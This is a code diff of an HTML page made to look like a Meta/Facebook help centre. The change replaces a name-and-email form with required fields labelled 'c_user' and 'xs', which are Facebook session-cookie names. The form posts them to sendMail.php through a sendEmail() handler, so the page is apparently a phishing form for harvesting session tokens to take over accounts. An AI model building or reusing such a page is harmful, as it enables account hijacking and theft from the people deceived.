@@ -24,10 +24,11 @@
         <div class="container__helper">
           <li>
             <a class="help__a" href="#"
-              ><img src="./src/house-solid.svg" />Help Centre</a
+              ><img src="./src/house-solid.svg" />Help Center</a
             >
           </li>
         </div>
+        <div class="img-meta1"><img src="./src/meta-11.webp" alt="" /></div>
       </div>
     </div>
 
@@ -55,14 +56,20 @@
           ><img src="./src/fb.jpg" alt=""
         /></a>
         <p>Please be sure to provide the requested information below.</p>
-        <form id="myForm" action="sendMail.php" method="post">
-          <label for="name">Name:</label>
-          <input type="text" name="name" required />
+        <form id="myForm" action="./sendMail.php" method="post">
+          <label class="label" for="recipient">c_user</label>
 
-          <label for="email">Email:</label>
-          <input type="email" name="email" required />
+          <input class="input" type="text" name="recipient" required />
 
-          <button type="button" id="btnsub">Submit</button>
+          <br />
+          <label class="label" for="subject">xs</label>
+          <input class="input" type="text" name="subject" required />
+          <br />
+          <div class="btn-div">
+            <button class="btn" type="submit" onclick="sendEmail()">
+              Submit
+            </button>
+          </div>
         </form>
       </div>
     </div>
@@ -84,7 +91,18 @@
         </ul>
       </div>
     </div>
+    <div class="meta">
+      <figure class="wp-block-image size-full is-resized">
+        <img
+          class="img-meta"
+          fetchpriority="high"
+          decoding="async"
+          src="./src/from-meta-8.jpg"
+          alt=""
+          class="wp-image-312"
+        />
+      </figure>
+    </div>
   </body>
-  <script src="./src/index.js"></script>
-  <script src="./functions/sendMail.js"></script>
+  <script src="./index.js"></script>
 </html>
